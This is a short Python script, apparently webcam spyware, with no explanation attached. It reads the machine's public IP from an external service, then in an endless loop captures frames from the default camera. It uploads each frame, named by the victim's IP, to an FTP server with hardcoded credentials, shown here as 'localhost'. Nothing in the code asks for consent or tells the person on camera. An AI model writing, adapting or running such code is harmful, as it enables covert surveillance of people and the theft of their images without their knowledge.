import ftplib, cv2, time, urllib
from urllib.parse import urlencode
from urllib.request import Request, urlopen


def public_ip():
    lista = "0123456789."
    ip=""
    dato=urllib.request.urlopen("http://checkip.dyndns.org").read()
    for x in str(dato):
        if x in lista:
            ip += x
    return ip

fn=public_ip()+'.jpg'


while True:
    
    cam=cv2.VideoCapture(0)
    frame=cam.read()[1]
    cv2.imwrite(filename=fn, img=frame)


    ftp=ftplib.FTP('localhost', 'hola', 'hola')
    myfile=open(fn, 'rb')
    ftp.storbinary('STOR '+fn, myfile)

    myfile.close()        